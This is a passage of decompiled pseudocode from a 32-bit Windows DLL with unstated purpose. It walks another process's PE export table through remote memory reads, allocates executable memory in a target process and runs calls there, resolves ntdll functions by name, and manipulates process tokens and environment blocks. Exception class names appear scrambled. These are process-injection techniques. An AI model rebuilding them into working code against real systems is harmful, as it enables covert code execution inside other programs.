            LOBYTE(v94) = 12;
            sub_10029DE8((int)v58);
            LOBYTE(v94) = 11;
            sub_10020ABE(v66);
            LOBYTE(v94) = 0;
            sub_10009696(v84);
            return a2;
          }
          sub_1000DEEF(&v71);
          v12 = &v71;
        }
        else
        {
          sub_1000DEEF(&v78);
          v12 = &v78;
        }
      }
      else
      {
        sub_1000DEEF(&v73);
        v12 = &v73;
      }
    }
LABEL_6:
    _CxxThrowException(v12, v41);
  }
  v14 = (wchar_t *)sub_1000BE16((int)&unk_1008EBC0);
  v44 = v15;
  Block = (int)&v44;
  sub_10009D2C(&v44, v14);
  v94 = 8;
  v43 = (char *)v16;
  v42 = v16;
  v92 = &v42;
  sub_10009F32(&v42, (int)&unk_10095608);
  LOBYTE(v94) = 0;
  v92 = sub_100265E5(v42, (int)v43, v44);
  Block = 128;
  sub_10029947((int)&v89, &Block);
  v94 = 10;
  v17 = *(_DWORD *)(v6[1] + 16);
  v45 = 0;
  v44 = a5 != 0 ? 4 : 0;
  v43 = a4;
  v42 = a3;
  v41 = 0;
  v18 = (void *)((int (__cdecl *)(int, _DWORD))v92)(v17, 0);
  sub_100299F4(v19, (int)&v89);
  if ( !v18 )
  {
    sub_1000DEEF(&v74);
    v38 = &_TI1_AVSnsziibtx_sr__;
    v12 = &v74;
    goto LABEL_6;
  }
  sub_1000F2B5(a2, v18, 0);
  v86 = 1;
  LOBYTE(v94) = 0;
  sub_10029A1B(&v89);
  return a2;
}
// 1001F7BE: variable 'v9' is possibly undefined
// 1001F7CF: variable 'v10' is possibly undefined
// 1001FA1B: variable 'v15' is possibly undefined
// 1001FA2F: variable 'v16' is possibly undefined
// 1001FA8D: variable 'v19' is possibly undefined
// 1001FEC1: variable 'v31' is possibly undefined
// 1001FED7: variable 'v32' is possibly undefined
// 1001FF59: variable 'v34' is possibly undefined
// 1001287F: using guessed type int sub_1001287F(void);
// 1002EF20: using guessed type void __noreturn sub_1002EF20(void);
// 1005BF07: using guessed type char byte_1005BF07;
// 1005BF33: using guessed type char byte_1005BF33;
// 10092414: using guessed type int (__cdecl *dword_10092414)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100957A0: using guessed type int dword_100957A0;
// 1001F77B: using guessed type _DWORD pExceptionObject[2];
// 1001F77B: using guessed type int var_100[6];
// 1001F77B: using guessed type _DWORD var_16C[2];
// 1001F77B: using guessed type _DWORD var_DC[2];
// 1001F77B: using guessed type _DWORD var_140[8];
// 1001F77B: using guessed type HANDLE var_B8[4];
// 1001F77B: using guessed type _DWORD var_24[2];
// 1001F77B: using guessed type int var_68[3];
// 1001F77B: using guessed type int var_1D0[5];

//----- (1002022F) --------------------------------------------------------
_DWORD *__thiscall sub_1002022F(_DWORD *this, _DWORD *a2, DWORD DesiredAccess)
{
  int v3; // eax
  HANDLE pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  HANDLE TokenHandle; // [esp+20h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  v3 = this[1];
  TokenHandle = 0;
  if ( !OpenProcessToken(*(HANDLE *)(v3 + 16), DesiredAccess, &TokenHandle) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_100268EB(a2, TokenHandle);
  return a2;
}

//----- (10020294) --------------------------------------------------------
DWORD __thiscall sub_10020294(_DWORD *this)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  DWORD pSessionId; // [esp+10h] [ebp-4h] BYREF

  v1 = sub_10013422(this);
  if ( !ProcessIdToSessionId(v1, &pSessionId) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return pSessionId;
}
// 10020294: using guessed type _DWORD pExceptionObject[3];

//----- (100202CF) --------------------------------------------------------
DWORD __thiscall sub_100202CF(void *this, int a2)
{
  int v3; // ecx
  int v4; // ecx
  char *v5; // eax
  DWORD v6; // esi
  int v8; // [esp-10h] [ebp-90h] BYREF
  int v9; // [esp-Ch] [ebp-8Ch]
  int v10[2]; // [esp-8h] [ebp-88h] BYREF
  int v11; // [esp+0h] [ebp-80h]
  int v12; // [esp+4h] [ebp-7Ch]
  int v13; // [esp+8h] [ebp-78h]
  void *v14; // [esp+1Ch] [ebp-64h]
  void *v15; // [esp+20h] [ebp-60h]
  int v16[3]; // [esp+24h] [ebp-5Ch] BYREF
  int v17[5]; // [esp+30h] [ebp-50h] BYREF
  _DWORD v18[10]; // [esp+44h] [ebp-3Ch] BYREF
  char v19; // [esp+6Ch] [ebp-14h]
  int v20; // [esp+7Ch] [ebp-4h]

  sub_1000C312(a2, (int)v17);
  v20 = 0;
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 44))(this, v18, v17[3], 64, 4096);
  LOBYTE(v20) = 1;
  v19 = 1;
  sub_1002A148(v18, v17);
  v13 = 60000;
  v12 = 0;
  v11 = v18[8];
  v10[1] = v3;
  v10[0] = v3;
  v14 = v10;
  sub_10009D2C(v10, aGetmodulehandl_0);
  LOBYTE(v20) = 2;
  v9 = v4;
  v8 = v4;
  v15 = &v8;
  sub_10009F32(&v8, (int)&unk_10095608);
  LOBYTE(v20) = 1;
  v5 = sub_100265E5(v8, v9, v10[0]);
  (*(void (__thiscall **)(void *, int *, char *, int, int, int))(*(_DWORD *)this + 56))(this, v16, v5, v11, v12, v13);
  LOBYTE(v20) = 4;
  sub_10014CC5((int)v16, 5000, 0);
  v6 = sub_1000F32C(v16);
  LOBYTE(v20) = 1;
  sub_1000F307(v16);
  LOBYTE(v20) = 0;
  sub_10029DE8((int)v18);
  v20 = -1;
  sub_1000C45D(v17);
  return v6;
}
// 10020348: variable 'v3' is possibly undefined
// 10020363: variable 'v4' is possibly undefined
// 100202CF: using guessed type int var_5C[3];

//----- (100203FA) --------------------------------------------------------
int __thiscall sub_100203FA(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax
  _DWORD *v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned __int16 v11; // ax
  int v12; // esi
  int pExceptionObject; // [esp+10h] [ebp-1DCh] BYREF
  _DWORD *v14; // [esp+14h] [ebp-1D8h] BYREF
  int v15[2]; // [esp+18h] [ebp-1D4h] BYREF
  _DWORD v16[4]; // [esp+20h] [ebp-1CCh] BYREF
  SIZE_T v17[5]; // [esp+30h] [ebp-1BCh] BYREF
  SIZE_T v18[5]; // [esp+44h] [ebp-1A8h] BYREF
  SIZE_T v19[5]; // [esp+58h] [ebp-194h] BYREF
  SIZE_T nSize[5]; // [esp+6Ch] [ebp-180h] BYREF
  SIZE_T v21[5]; // [esp+80h] [ebp-16Ch] BYREF
  SIZE_T v22[5]; // [esp+94h] [ebp-158h] BYREF
  _DWORD v23[2]; // [esp+A8h] [ebp-144h] BYREF
  int v24[9]; // [esp+B0h] [ebp-13Ch] BYREF
  _DWORD v25[2]; // [esp+D4h] [ebp-118h] BYREF
  int v26[9]; // [esp+DCh] [ebp-110h] BYREF
  char v27[8]; // [esp+100h] [ebp-ECh] BYREF
  char v28[36]; // [esp+108h] [ebp-E4h] BYREF
  char v29[8]; // [esp+12Ch] [ebp-C0h] BYREF
  int v30[9]; // [esp+134h] [ebp-B8h] BYREF
  char v31[8]; // [esp+158h] [ebp-94h] BYREF
  int v32[9]; // [esp+160h] [ebp-8Ch] BYREF
  char v33[8]; // [esp+184h] [ebp-68h] BYREF
  int v34[9]; // [esp+18Ch] [ebp-60h] BYREF
  char v35[8]; // [esp+1B0h] [ebp-3Ch] BYREF
  int v36[10]; // [esp+1B8h] [ebp-34h] BYREF
  int v37; // [esp+1E8h] [ebp-4h]

  if ( !a2 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10029CE8(a2, (int)this, (int)v35, 64);
  v37 = 0;
  sub_1000C28D((void *)0x40, (int)nSize, 0);
  LOBYTE(v37) = 1;
  if ( sub_1002A361(v36, nSize) != 64 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v4 = sub_1000C52E(nSize);
  if ( *(_WORD *)v4 != 23117 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10029CE8(*(_DWORD *)(v4 + 60) + a2 + 24, (int)this, (int)v31, 224);
  LOBYTE(v37) = 2;
  sub_1000C28D((void *)0xE0, (int)v18, 0);
  LOBYTE(v37) = 3;
  if ( sub_1002A361(v32, v18) != 224 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = sub_1000C52E(v18);
  if ( *(_WORD *)v5 != 267 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10029CE8(*(_DWORD *)(v5 + 96) + a2, (int)this, (int)v29, 40);
  LOBYTE(v37) = 4;
  sub_1000C28D((void *)0x28, (int)v17, 0);
  LOBYTE(v37) = 5;
  if ( sub_1002A361(v30, v17) != 40 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (_DWORD *)sub_1000C52E(v17);
  v7 = v6[8];
  v14 = v6;
  if ( !v7 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10029CE8(v7 + a2, (int)this, (int)v33, 4 * v6[6]);
  LOBYTE(v37) = 6;
  v8 = v6[9];
  if ( !v8 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10029CE8(v8 + a2, (int)this, (int)v25, 2 * v6[5]);
  LOBYTE(v37) = 7;
  sub_10029CE8(a2 + v6[7], (int)this, (int)v23, 4 * v6[5]);
  LOBYTE(v37) = 8;
  pExceptionObject = 0;
  if ( v6[6] )
  {
    while ( 1 )
    {
      sub_1000C28D((void *)4, (int)v19, 0);
      LOBYTE(v37) = 9;
      if ( sub_1002A361(v34, v19) != 4 )
      {
        sub_1000DEEF(&v14);
        _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      v9 = sub_1000C77C(v19, 0);
      sub_10029CE8(v9 + a2, (int)this, (int)v27, 0);
      LOBYTE(v37) = 10;
      sub_1002EB0E(v16, (int)v28);
      LOBYTE(v37) = 11;
      sub_1002EBF1(v16, v15);
      LOBYTE(v37) = 12;
      if ( !sub_1000A1C0(a3, (int)v15) )
        break;
      LOBYTE(v37) = 11;
      sub_10009F65(v15);
      LOBYTE(v37) = 10;
      sub_1002EB5F(v16);
      LOBYTE(v37) = 9;
      sub_10029DE8((int)v27);
      LOBYTE(v37) = 8;
      sub_1000C45D((int *)v19);
      if ( (unsigned int)++pExceptionObject >= v14[6] )
        goto LABEL_21;
    }
    sub_1002A2C1(v25, 2 * pExceptionObject, 0);
    sub_1000C28D((void *)2, (int)v22, 0);
    LOBYTE(v37) = 13;
    if ( sub_1002A361(v26, v22) != 2 )
    {
      sub_1000DEEF(&v14);
      _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v11 = sub_1000C7D0(v22);
    sub_1002A2C1(v23, 4 * v11, 0);
    sub_1000C28D((void *)4, (int)v21, 0);
    LOBYTE(v37) = 14;
    if ( sub_1002A361(v24, v21) != 4 )
    {
      sub_1000DEEF(&v14);
      _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v12 = sub_1000C77C(v21, 0) + a2;
    LOBYTE(v37) = 13;
    sub_1000C45D((int *)v21);
    LOBYTE(v37) = 12;
    sub_1000C45D((int *)v22);
    LOBYTE(v37) = 11;
    sub_10009F65(v15);
    LOBYTE(v37) = 10;
    sub_1002EB5F(v16);
    LOBYTE(v37) = 9;
    sub_10029DE8((int)v27);
    LOBYTE(v37) = 8;
    sub_1000C45D((int *)v19);
    LOBYTE(v37) = 7;
    sub_10029DE8((int)v23);
    LOBYTE(v37) = 6;
    sub_10029DE8((int)v25);
    LOBYTE(v37) = 5;
    sub_10029DE8((int)v33);
    LOBYTE(v37) = 4;
    sub_1000C45D((int *)v17);
    LOBYTE(v37) = 3;
    sub_10029DE8((int)v29);
    LOBYTE(v37) = 2;
    sub_1000C45D((int *)v18);
    LOBYTE(v37) = 1;
    sub_10029DE8((int)v31);
    LOBYTE(v37) = 0;
    sub_1000C45D((int *)nSize);
    v37 = -1;
    sub_10029DE8((int)v35);
    return v12;
  }
  else
  {
LABEL_21:
    LOBYTE(v37) = 7;
    sub_10029DE8((int)v23);
    LOBYTE(v37) = 6;
    sub_10029DE8((int)v25);
    LOBYTE(v37) = 5;
    sub_10029DE8((int)v33);
    LOBYTE(v37) = 4;
    sub_1000C45D((int *)v17);
    LOBYTE(v37) = 3;
    sub_10029DE8((int)v29);
    LOBYTE(v37) = 2;
    sub_1000C45D((int *)v18);
    LOBYTE(v37) = 1;
    sub_10029DE8((int)v31);
    LOBYTE(v37) = 0;
    sub_1000C45D((int *)nSize);
    v37 = -1;
    sub_10029DE8((int)v35);
    return 0;
  }
}
// 100203FA: using guessed type int var_34[10];
// 100203FA: using guessed type int var_8C[9];
// 100203FA: using guessed type int var_B8[9];
// 100203FA: using guessed type _DWORD var_118[2];
// 100203FA: using guessed type _DWORD var_144[2];
// 100203FA: using guessed type int var_60[9];
// 100203FA: using guessed type char var_E4[36];
// 100203FA: using guessed type _DWORD var_1CC[4];
// 100203FA: using guessed type int var_110[9];
// 100203FA: using guessed type int var_13C[9];

//----- (10020A37) --------------------------------------------------------
int __thiscall sub_10020A37(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // eax

  v4 = *this;
  v5 = (*(int (__thiscall **)(int *, int, int))(*this + 60))(this, a2, a3);
  return (*(int (__thiscall **)(int *, int))(v4 + 68))(this, v5);
}

//----- (10020A55) --------------------------------------------------------
int __thiscall sub_10020A55(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10020A83) --------------------------------------------------------
_DWORD *__usercall sub_10020A83@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (10020ABE) --------------------------------------------------------
void __thiscall sub_10020ABE(void *this)
{
  sub_10020B2C((int)this);
}

//----- (10020AE9) --------------------------------------------------------
void __usercall sub_10020AE9(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10020B2C((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (10020B2C) --------------------------------------------------------
void __usercall sub_10020B2C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10020B54) --------------------------------------------------------
int *__stdcall sub_10020B54(int a1, int a2, HANDLE hToken)
{
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  dword_10091B04 = (int)&off_10074288;
  if ( !CreateEnvironmentBlock(&Environment, hToken, 0) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10026929(&a1);
  return &dword_10091B04;
}
// 10074288: using guessed type int (__thiscall *off_10074288)(void *Block, char);
// 10091B04: using guessed type int dword_10091B04;

//----- (10020BB3) --------------------------------------------------------
LPVOID *__thiscall sub_10020BB3(LPVOID *Block, char a2)
{
  sub_10020BD2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020BD2) --------------------------------------------------------
BOOL __thiscall sub_10020BD2(LPVOID *this)
{
  *this = &off_10074288;
  return DestroyEnvironmentBlock(this[1]);
}
// 10074288: using guessed type int (__thiscall *off_10074288)(void *Block, char);

//----- (10020C05) --------------------------------------------------------
int __thiscall sub_10020C05(_DWORD *this)
{
  return this[1];
}

//----- (10020C0F) --------------------------------------------------------
int *__cdecl sub_10020C0F(int *a1, int a2)
{
  _ThrowInfo *v2; // ecx
  char *ModuleHandleA; // edi
  void **p_pExceptionObject; // eax
  char *v5; // eax
  int v6; // eax
  int v7; // eax
  _ThrowInfo *v9; // [esp-8h] [ebp-50h] BYREF
  _ThrowInfo *v10; // [esp-4h] [ebp-4Ch]
  char v11[8]; // [esp+10h] [ebp-38h] BYREF
  __int16 v12; // [esp+18h] [ebp-30h] BYREF
  __int16 v13; // [esp+1Ah] [ebp-2Eh]
  __int16 *v14; // [esp+1Ch] [ebp-2Ch]
  void *v15[2]; // [esp+20h] [ebp-28h] BYREF
  int v16; // [esp+28h] [ebp-20h]
  char *pExceptionObject; // [esp+2Ch] [ebp-1Ch] BYREF
  __int16 v18[2]; // [esp+30h] [ebp-18h] BYREF
  int v19[4]; // [esp+34h] [ebp-14h] BYREF
  int v20; // [esp+44h] [ebp-4h]

  v20 = 0;
  v16 = 0;
  v18[0] = 0;
  v19[0] = 0;
  v18[1] = 0;
  ModuleHandleA = (char *)GetModuleHandleA(aNtdllDll_2);
  if ( !ModuleHandleA )
  {
    sub_1000DEEF(&pExceptionObject);
    v10 = (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__;
    p_pExceptionObject = (void **)&pExceptionObject;
    goto LABEL_3;
  }
  v10 = v2;
  v9 = v2;
  pExceptionObject = (char *)&v9;
  sub_10009D2C(&v9, aRtlexpandenvir);
  v20 = 0;
  pExceptionObject = sub_10026590(ModuleHandleA, (int)v9);
  v15[1] = &v9;
  sub_10009D2C(&v9, aRtlinitunicode);
  v20 = 0;
  v5 = sub_10026590(ModuleHandleA, (int)v9);
  ((void (__stdcall *)(char *, _DWORD))v5)(v11, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12));
  v14 = v18;
  v12 = 0;
  v13 = 0;
  v6 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))pExceptionObject)(0, v11, &v12, v19);
  if ( v6 != -1073741789 && v6 < 0 )
    goto LABEL_6;
  sub_10009D9C((unsigned int)v19[0] >> 1, a1);
  v20 = 0;
  v16 = 1;
  v14 = (__int16 *)sub_1000A1E4(a1);
  v7 = a1[1];
  v12 = 0;
  v13 = 2 * *(_DWORD *)(v7 + 28);
  v6 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))pExceptionObject)(0, v11, &v12, v19);
  if ( v6 < 0 )
  {
LABEL_6:
    sub_1002CAFE(v15, v6);
    v10 = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    p_pExceptionObject = v15;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v10);
  }
  sub_1000A223((int)a1);
  return a1;
}
// 10020C58: variable 'v2' is possibly undefined

//----- (10020D40) --------------------------------------------------------
void __usercall sub_10020D40(_DWORD *a1@<edi>)
{
  int *v1; // eax
  void *pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetCurrentDirectoryW(0x104u, Buffer) )
  {
    sub_1002D697(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_10009D2C(v3, Buffer);
  v6 = 1;
  v1 = sub_10021136(v3);
  sub_10009F32(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v3);
  sub_10056753();
}

//----- (10020DD7) --------------------------------------------------------
void __thiscall sub_10020DD7(_DWORD *this)
{
  _DWORD *v1; // edx

  sub_1002D6E8(this + 2);
  sub_1000DF1A(v1);
}
// 10020DE3: variable 'v1' is possibly undefined

//----- (10020DE8) --------------------------------------------------------
_DWORD *__thiscall sub_10020DE8(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10074298;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000DEB4(this + 2, v4);
  }
  sub_1000936A(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10074290;
  return this;
}
// 10074290: using guessed type int (__stdcall *off_10074290)(char);

//----- (10020E57) --------------------------------------------------------
_DWORD *__thiscall sub_10020E57(_DWORD *this, char a2)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edx

  v2 = this - 2;
  sub_1002D6E8(this);
  sub_1000DF1A(v3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}
// 10020E6A: variable 'v3' is possibly undefined

//----- (10020E83) --------------------------------------------------------
void __usercall sub_10020E83(_DWORD *a1@<edi>)
{
  int *v1; // eax
  void *pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetWindowsDirectoryW(Buffer, 0x104u) )
  {
    sub_1002D697(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_10009D2C(v3, Buffer);
  v6 = 1;
  v1 = sub_10021136(v3);
  sub_10009F32(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v3);
  sub_10056753();
}

//----- (10020F1A) --------------------------------------------------------
void __usercall sub_10020F1A(_DWORD *a1@<edi>)
{
  int *v1; // eax
  void *pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetSystemDirectoryW(Buffer, 0x104u) )
  {
    sub_1002D697(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_10009D2C(v3, Buffer);
  v6 = 1;
  v1 = sub_10021136(v3);
  sub_10009F32(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v3);
  sub_10056753();
}

//----- (10020FB1) --------------------------------------------------------
void __usercall sub_10020FB1(_DWORD *a1@<edi>)
{
  int *v1; // eax
  void *pExceptionObject[4]; // [esp+10h] [ebp-240h] BYREF
  int v3[2]; // [esp+20h] [ebp-230h] BYREF
  int v4; // [esp+28h] [ebp-228h]
  WCHAR Buffer[272]; // [esp+2Ch] [ebp-224h] BYREF
  int v6; // [esp+24Ch] [ebp-4h]

  v4 = 0;
  pExceptionObject[3] = a1;
  if ( !GetTempPathW(0x104u, Buffer) )
  {
    sub_1002D697(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_10009D2C(v3, Buffer);
  v6 = 1;
  v1 = sub_10021136(v3);
  sub_10009F32(a1, (int)v1);
  v4 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v3);
  sub_10056753();
}

//----- (10021048) --------------------------------------------------------
void __usercall sub_10021048(_DWORD *a1@<esi>, int a2, int a3, int a4, int a5)
{
  void *pExceptionObject[5]; // [esp+10h] [ebp-22Ch] BYREF
  WCHAR TempFileName[266]; // [esp+24h] [ebp-218h] BYREF
  int v7; // [esp+238h] [ebp-4h]

  pExceptionObject[4] = 0;
  pExceptionObject[3] = a1;
  v7 = 2;
  if ( !GetTempFileNameW(*(LPCWSTR *)(a3 + 12), *(LPCWSTR *)(a5 + 12), 0, TempFileName) )
  {
    sub_1002D697(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
  }
  sub_10009D2C(a1, TempFileName);
  LOBYTE(v7) = 1;
  sub_10009F65(&a2);
  LOBYTE(v7) = 0;
  sub_10009F65(&a4);
  sub_10056753();
}

//----- (100210E0) --------------------------------------------------------
_DWORD *__cdecl sub_100210E0(_DWORD *a1)
{
  int v1; // ecx
  int v3; // [esp-8h] [ebp-38h] BYREF
  int v4; // [esp-4h] [ebp-34h]
  int v5[11]; // [esp+0h] [ebp-30h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v5[8] = 0;
  v5[7] = (int)v5;
  sub_10009F32(v5, (int)&unk_100955C0);
  v6 = 1;
  v4 = v1;
  v3 = v1;
  v5[6] = (int)&v3;
  sub_10020FB1(&v3);
  LOBYTE(v6) = 0;
  sub_10021048(a1, v3, v4, v5[0], v5[1]);
  return a1;
}
// 1002110B: variable 'v1' is possibly undefined

//----- (10021136) --------------------------------------------------------
int *__thiscall sub_10021136(int *this)
{
  int v3[5]; // [esp+10h] [ebp-18h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  if ( *(_WORD *)sub_1000A0AA(this, *(_DWORD *)(this[1] + 28) - 1) != 92 )
  {
    sub_10009D2C(v3, asc_1008E89C);
    v4 = 0;
    sub_1000A0C4((int)this, (int)v3);
    v4 = -1;
    sub_10009F65(v3);
  }
  return this;
}

//----- (10021188) --------------------------------------------------------
_DWORD *__stdcall sub_10021188(_DWORD *a1, int a2, int a3)
{
  sub_10025A41((int)a1, a2, 0);
  a1[4] = a3;
  *a1 = &off_100742A0;
  sub_1000C28D((void *)1, (int)(a1 + 5), 0);
  return a1;
}
// 100742A0: using guessed type int (__thiscall *off_100742A0)(void *Block, char);

//----- (100211CE) --------------------------------------------------------
void *__thiscall sub_100211CE(void *Block, char a2)
{
  sub_100211ED((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100211ED) --------------------------------------------------------
void __thiscall sub_100211ED(int this)
{
  *(_DWORD *)this = &off_100742A0;
  sub_10025AE7((_BYTE *)this);
  sub_1000C45D((int *)(this + 20));
  sub_10025A99((_BYTE *)this);
}
// 100742A0: using guessed type int (__thiscall *off_100742A0)(void *Block, char);

//----- (10021245) --------------------------------------------------------
int __thiscall sub_10021245(void *this, _BYTE *a2)
{
  int v2; // esi
  int v3; // edi

  v2 = (int)this + 20;
  v3 = (*(int (__stdcall **)(int))(*(_DWORD *)this + 12))((int)this + 20);
  if ( v3 )
    *a2 = *(_BYTE *)sub_1000C55B(v2, 0);
  return v3;
}

//----- (10021271) --------------------------------------------------------
int __thiscall sub_10021271(_DWORD **this, int a2)
{
  int v3; // eax
  int v4; // ebx
  int v6; // eax
  int v7[5]; // [esp+10h] [ebp-48h] BYREF
  int v8[5]; // [esp+24h] [ebp-34h] BYREF
  int v9[7]; // [esp+38h] [ebp-20h] BYREF
  int v10; // [esp+54h] [ebp-4h]

  sub_1000C28D(*(void **)(a2 + 12), (int)v9, 0);
  v10 = 0;
  v3 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 12))(v3, v9);
  if ( v4 )
  {
    sub_1000C73C(v4, (int *)a2, (int)v8, 0);
    LOBYTE(v10) = 1;
    v6 = sub_1000C709(v4, v9, (int)v7, 0);
    LOBYTE(v10) = 2;
    (*(void (__thiscall **)(_DWORD *, int, int *))(*this[4] + 12))(this[4], v6, v8);
    LOBYTE(v10) = 1;
    sub_1000C45D(v7);
    LOBYTE(v10) = 0;
    sub_1000C45D(v8);
  }
  v10 = -1;
  sub_1000C45D(v9);
  return v4;
}
// 10021271: using guessed type int var_20[7];
// 10021271: using guessed type int var_34[5];
// 10021271: using guessed type int var_48[5];

//----- (10021309) --------------------------------------------------------
int __thiscall sub_10021309(_DWORD **this, int a2, int a3)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax

  v4 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  v5 = ((int (__thiscall *)(_DWORD **))(*this)[11])(this);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 8))(v5, a2, a3);
  v6 = ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this[4] + 16))(this[4], v6 - v4);
}

//----- (10021343) --------------------------------------------------------
int __thiscall sub_10021343(_DWORD **this)
{
